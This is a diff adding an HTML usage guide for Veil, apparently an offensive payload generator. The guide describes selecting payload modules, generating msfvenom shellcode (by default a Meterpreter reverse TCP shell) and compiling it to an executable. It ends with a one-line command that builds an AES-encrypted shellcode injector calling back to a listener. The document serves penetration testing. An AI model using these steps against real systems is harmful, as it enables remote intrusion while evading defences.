@@ -1,0 +1,26 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Usage</title>
+</head><body>To launch Veil, execute $./Veil.py . Upon an initial run, Veil will execute ./config/update.py, which attempts to detect installation directories, operating system details, and other relevant specifications, which it writes out to /etc/veil/settings.py. This settings configuration file is also manually editable.<br/>
+<br/>
+After configuration, you will be presented with the main menu. This details the number of payload modules loaded as well as useful commands:<br/>
+<br/>
+Type “list” to list all payloads:<br/>
+<br/>
+To list information on a specific payload, type “info [payload number/payload name]“, or “info [tab]” to tab complete the the payloads available. To use a payload, type “use [payload number/payload name]“, or “use [tab]” to tab complete the the payloads available. You can also just type the number of the payload from list in order to use the associated payload. On loading a specific module, the payload menu is presented:<br/>
+<br/>
+This presents details and required options for the payloads, as well as relevant commands. Typing “info” will give more detailed information about the payload:<br/>
+<br/>
+Under “required options”, the name of the option as well as its default value and description are displayed. If a value isn’t filled in for the default, you will be required to input a value before the payload can be generated. To set an option value, type “set [option name]” then type the desired value.<br/>
+<br/>
+After filling in the required options, to actually generate the payload, type “generate“. If the payload uses shellcode, you will be taken to the shellcode menu, where you can select 1) msfvenom or 2) custom shellcode. If custom shellcode is selected, input your shellcode in the form \x01\x02… without quotes and newlines (\n). If msfvenom is chosen, you will be presented with the default choice of windows/meterpreter/reverse_tcp. If you want another payload, enter the windows payload in msfvenom syntax, or press [tab] to tab complete the available payloads. The MSF tree is automatically crawled, and payloads/options extracted. After choosing a payload, required options are presented (LHOST is tab completable for the local IP and LPORT is tab completable for 4444, the default MSF port). After filling in required options, the opportunity to enter extra msfvenom options in “OPTION=value” syntax is presented.<br/>
+<br/>
+After pressing enter, shellcode is generated and the payload is built. You are then presented with the output menu, where you can choose the base name for your generated payload files. If your payload was python based and you set “compile_to_exe” in the options, you will be presented with the option of pyinstaller (compile to exe natively on Kali linux) or the generation of py2exe files.<br/>
+<br/>
+The final screen displays information on the generated payload, including any compiled/source file locations. Pressing any key will return you to the main menu.<br/>
+<br/>
+Veil also now incorporates command line switches for almost all options. ./Veil.py -h details all the available options. A quick example:<br/>
+<br/>
+$./Veil.py -p python/shellcode_inject/aes_encrypt -o output --msfpayload windows/meterpreter/reverse_tcp --msfoptions LHOST=192.168.1.1 LPORT=443</body></html>
